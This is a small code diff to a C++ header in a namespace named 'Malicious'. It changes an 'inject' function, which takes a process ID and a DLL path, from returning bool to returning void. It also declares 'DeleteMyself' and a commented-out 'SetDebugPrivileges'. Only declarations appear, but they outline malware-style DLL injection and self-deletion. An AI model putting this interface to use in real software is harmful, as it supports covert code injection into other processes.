@@ -10,7 +10,7 @@ namespace Malicious
 	typedef Common::Exception InjectionError;
 
 	void DeleteMyself(const char * tempfilename, const char * cmd);
-	bool inject(DWORD pid, std::string dll);
+	void inject(DWORD pid, std::string dll);
     //void SetDebugPrivileges();
 
 } // Malicious
